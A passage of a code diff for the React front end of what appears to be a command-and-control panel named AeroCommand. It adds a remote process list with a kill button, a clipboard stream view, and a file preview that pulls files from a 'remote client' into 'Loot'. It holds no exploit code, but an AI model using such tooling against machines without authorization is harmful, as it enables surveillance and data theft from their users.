+                        <th className="p-3 font-bold uppercase tracking-wider">PID</th>
+                        <th className="p-3 font-bold uppercase tracking-wider">Memory</th>
+                        <th className="p-3 font-bold uppercase tracking-wider">User</th>
+                        <th className="p-3 font-bold uppercase tracking-wider">Window Title</th>
+                        <th className="p-3 font-bold uppercase tracking-wider text-right">Actions</th>
+                      </tr>
+                    </thead>
+                    <tbody className="divide-y divide-c2border text-[11px] font-mono">
+                      {isProcessesLoading && processList.length === 0 ? (
+                        <tr>
+                          <td colSpan={6} className="p-12 text-center text-slate-500">
+                            <div className="flex flex-col items-center space-y-3">
+                              <RefreshCw className="w-8 h-8 animate-spin opacity-20" />
+                              <span className="text-[10px] font-bold uppercase tracking-[0.2em]">Gathering process list...</span>
+                            </div>
+                          </td>
+                        </tr>
+                      ) : (
+                        processList
+                          .filter(p => 
+                            p.name.toLowerCase().includes(processSearch.toLowerCase()) || 
+                            p.pid.includes(processSearch) ||
+                            p.title.toLowerCase().includes(processSearch.toLowerCase())
+                          )
+                          .map((p, i) => (
+                            <tr key={i} className="hover:bg-slate-800/30 group transition-colors">
+                              <td className="p-3 text-slate-200 font-bold flex items-center space-x-2">
+                                <Cpu className="w-3 h-3 text-c2accent opacity-50" />
+                                <span>{p.name}</span>
+                              </td>
+                              <td className="p-3 text-slate-400">{p.pid}</td>
+                              <td className="p-3 text-emerald-400/70">{p.mem}</td>
+                              <td className="p-3 text-slate-500 truncate max-w-[120px]">{p.user}</td>
+                              <td className="p-3 text-slate-400 italic truncate max-w-[200px]">{p.title || '-'}</td>
+                              <td className="p-3 text-right">
+                                <button 
+                                  onClick={() => killProcess(p.pid)}
+                                  className="px-2 py-1 bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white rounded text-[9px] font-bold transition-all border border-red-500/20 opacity-0 group-hover:opacity-100"
+                                >
+                                  KILL
+                                </button>
+                              </td>
+                            </tr>
+                          ))
+                      )}
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* 6. CLIPBOARD VIEW */}
           {activeTab === 'clipboard' && (
             <div className="h-full flex flex-col space-y-4">
               <h2 className="text-lg font-bold">Clipboard Stream</h2>
@@ -710,6 +1452,194 @@ export default function App() {
 
         </main>
       </div>
+
+      {/* ==================== INSTANT FILE PREVIEW MODAL ==================== */}
+      {previewOpen && (
+        <div 
+          className="fixed inset-0 z-[100] flex items-center justify-center p-4 sm:p-6 md:p-10 bg-slate-950/80 backdrop-blur-md animate-in fade-in duration-200"
+          onClick={(e) => {
+            if (e.target === e.currentTarget) setPreviewOpen(false);
+          }}
+        >
+          <div className="w-full max-w-4xl max-h-[88vh] bg-c2sidebar border border-c2border rounded-xl shadow-2xl flex flex-col overflow-hidden animate-in zoom-in-95 duration-200">
+            {/* Modal Header */}
+            <div className="px-5 py-3.5 border-b border-c2border bg-slate-900/60 flex items-center justify-between">
+              <div className="flex items-center space-x-3 min-w-0 flex-1">
+                <div className="p-2 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 shrink-0">
+                  {previewData?.type === 'image' ? (
+                    <ImageIcon className="w-5 h-5" />
+                  ) : previewData?.type === 'text' ? (
+                    <FileText className="w-5 h-5" />
+                  ) : (
+                    <FileGeneric className="w-5 h-5" />
+                  )}
+                </div>
+                <div className="min-w-0 flex-1">
+                  <div className="flex items-center space-x-2">
+                    <h3 className="text-sm font-bold text-slate-100 truncate">{previewData?.name || 'File Preview'}</h3>
+                    {previewData?.type && (
+                      <span className="px-2 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider bg-slate-800 border border-c2border text-c2accent">
+                        {previewData.type}
+                      </span>
+                    )}
+                    {previewData?.size && (
+                      <span className="text-[10px] font-mono text-slate-400">{previewData.size}</span>
+                    )}
+                  </div>
+                  <div className="text-[10px] font-mono text-slate-500 truncate mt-0.5">{previewData?.path}</div>
+                </div>
+              </div>
+
+              {/* Action Buttons */}
+              <div className="flex items-center space-x-2 shrink-0 ml-4">
+                {/* Zoom Controls for Images */}
+                {previewData?.type === 'image' && !isPreviewLoading && (
+                  <div className="flex items-center space-x-1 bg-slate-800/80 border border-c2border rounded p-0.5 mr-1">
+                    <button
+                      onClick={() => setPreviewZoom(z => Math.max(0.25, z - 0.25))}
+                      className="p-1 hover:bg-slate-700 text-slate-300 rounded transition-colors"
+                      title="Zoom Out"
+                    >
+                      <ZoomOut className="w-3.5 h-3.5" />
+                    </button>
+                    <span className="text-[10px] font-mono px-1.5 text-slate-400">{Math.round(previewZoom * 100)}%</span>
+                    <button
+                      onClick={() => setPreviewZoom(z => Math.min(3, z + 0.25))}
+                      className="p-1 hover:bg-slate-700 text-slate-300 rounded transition-colors"
+                      title="Zoom In"
+                    >
+                      <ZoomIn className="w-3.5 h-3.5" />
+                    </button>
+                    {previewZoom !== 1 && (
+                      <button
+                        onClick={() => setPreviewZoom(1)}
+                        className="text-[9px] font-bold text-c2accent px-1 hover:underline"
+                        title="Reset Zoom"
+                      >
+                        Reset
+                      </button>
+                    )}
+                  </div>
+                )}
+
+                {/* Copy Path */}
+                <button
+                  onClick={() => {
+                    if (previewData?.path) {
+                      navigator.clipboard.writeText(previewData.path);
+                      setCopiedPath(true);
+                      setTimeout(() => setCopiedPath(false), 2000);
+                    }
+                  }}
+                  className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 border border-c2border rounded text-xs font-semibold text-slate-300 flex items-center space-x-1.5 transition-colors"
+                  title="Copy absolute path"
+                >
+                  {copiedPath ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                  <span>{copiedPath ? 'Copied' : 'Path'}</span>
+                </button>
+
+                {/* Download */}
+                <button
+                  onClick={() => {
+                    if (previewData?.path) {
+                      executeCommand(`download "${previewData.path}"`);
+                    }
+                  }}
+                  className="px-2.5 py-1.5 bg-c2accent/20 hover:bg-c2accent/30 border border-c2accent/40 rounded text-xs font-semibold text-c2accent flex items-center space-x-1.5 transition-colors"
+                  title="Download full file to Loot"
+                >
+                  <Download className="w-3.5 h-3.5" />
+                  <span>Download</span>
+                </button>
+
+                {/* Close Button */}
+                <button
+                  onClick={() => setPreviewOpen(false)}
+                  className="p-1.5 hover:bg-rose-500/20 hover:text-rose-400 text-slate-400 rounded-lg transition-colors"
+                  title="Close (Esc)"
+                >
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+            </div>
+
+            {/* Modal Body */}
+            <div className="flex-1 overflow-auto p-4 flex items-center justify-center min-h-[360px] max-h-[70vh] bg-slate-950/40">
+              {isPreviewLoading ? (
+                <div className="flex flex-col items-center justify-center space-y-3 p-12 text-slate-400">
+                  <div className="relative">
+                    <div className="w-12 h-12 rounded-full border-2 border-c2accent/20 border-t-c2accent animate-spin" />
+                    <Eye className="w-5 h-5 text-c2accent absolute inset-0 m-auto" />
+                  </div>
+                  <div className="text-xs font-semibold">Streaming preview from remote client...</div>
+                  <div className="text-[10px] text-slate-500 font-mono">Fetching payload over encrypted C2</div>
+                </div>
+              ) : previewData?.status === 'error' ? (
+                <div className="p-8 text-center max-w-md">
+                  <div className="w-12 h-12 rounded-full bg-rose-500/10 border border-rose-500/30 text-rose-400 flex items-center justify-center mx-auto mb-3">
+                    <ShieldCheck className="w-6 h-6" />
+                  </div>
+                  <h4 className="text-sm font-bold text-slate-200 mb-1">Preview Unavailable</h4>
+                  <p className="text-xs text-rose-400 font-mono">{previewData.message || 'Could not read file.'}</p>
+                </div>
+              ) : previewData?.type === 'image' && previewData.data ? (
+                <div 
+                  className="w-full h-full flex items-center justify-center overflow-auto p-4 rounded-lg"
+                  style={{ 
+                    backgroundImage: 'radial-gradient(#334155 1px, transparent 1px)', 
+                    backgroundSize: '16px 16px',
+                    backgroundColor: '#090d16'
+                  }}
+                >
+                  <img
+                    src={`data:${previewData.mime || 'image/png'};base64,${previewData.data}`}
+                    alt={previewData.name || 'Preview'}
+                    style={{ transform: `scale(${previewZoom})`, transformOrigin: 'center center' }}
+                    className="max-h-[60vh] max-w-full object-contain rounded shadow-2xl transition-transform duration-150 select-none border border-slate-800"
+                  />
+                </div>
+              ) : previewData?.type === 'text' && previewData.content !== undefined ? (
+                <div className="w-full h-full flex flex-col bg-slate-900/90 rounded-lg border border-c2border overflow-hidden">
+                  <div className="px-3 py-1.5 bg-slate-800/80 border-b border-c2border text-[10px] font-mono text-slate-400 flex items-center justify-between">
+                    <span>Document View</span>
+                    <span>UTF-8 Text</span>
+                  </div>
+                  <pre className="flex-1 p-4 overflow-auto font-mono text-xs text-slate-200 leading-relaxed whitespace-pre-wrap select-text">
+                    {previewData.content}
+                  </pre>
+                </div>
+              ) : previewData?.status === 'unsupported' ? (
+                <div className="p-8 text-center max-w-md space-y-4">
+                  <div className="w-12 h-12 rounded-full bg-slate-800 border border-c2border text-slate-400 flex items-center justify-center mx-auto">
+                    <FileGeneric className="w-6 h-6" />
+                  </div>
+                  <div>
+                    <h4 className="text-sm font-bold text-slate-200 mb-1">Binary File</h4>
+                    <p className="text-xs text-slate-400">
+                      {previewData.message || 'Direct visual preview is not supported for this format.'}
+                    </p>
+                  </div>
+                  <button
+                    onClick={() => previewData.path && executeCommand(`download "${previewData.path}"`)}
+                    className="px-4 py-2 bg-c2accent text-slate-900 rounded font-bold text-xs hover:opacity-90 transition-opacity inline-flex items-center space-x-2"
+                  >
+                    <Download className="w-4 h-4" />
+                    <span>Download Complete File</span>
+                  </button>
+                </div>
+              ) : (
+                <div className="text-slate-500 text-xs italic">No preview data</div>
+              )}
+            </div>
+
+            {/* Modal Footer */}
+            <div className="px-5 py-2.5 border-t border-c2border bg-slate-900/40 text-[10px] text-slate-500 flex items-center justify-between">
+              <span>Press <kbd className="px-1.5 py-0.5 bg-slate-800 border border-c2border rounded font-mono text-slate-300">ESC</kbd> to close</span>
+              <span>AeroCommand Live Stream Engine</span>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
